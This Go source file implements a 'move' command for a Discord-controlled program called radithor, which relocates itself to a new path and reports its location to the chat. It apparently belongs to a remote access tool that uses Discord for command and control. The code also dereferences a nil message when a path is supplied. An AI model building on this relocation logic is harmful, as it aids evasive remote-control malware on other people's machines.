package commands_this

import (
	"fmt"

	"radithor/bot/discord"
	"radithor/core/core_funcs"
	"radithor/utils"

	"github.com/bwmarrin/discordgo"
)

func move(ctx *discord.CommandContext, args []string) {
	newPath := utils.UnwrapQuotes(args)

	var msg *discordgo.Message

	if newPath == "" {
		msg, _ = ctx.ReplyMsg("Searching for new location...")
	}

	var relocatedTo string

	triggerRelocation := make(chan struct{})

	err := core_funcs.Relocate(newPath, &relocatedTo, triggerRelocation)
	if err != nil {
		ctx.DeleteMsg(msg.ID)
		ctx.ReplyMsg(fmt.Sprintf("Failed to relocate - %s", err))
		return
	}

	ctx.DeleteMsg(msg.ID)
	ctx.ReplyMsg(fmt.Sprintf("Relocating to `%s`", relocatedTo))

	close(triggerRelocation)
}
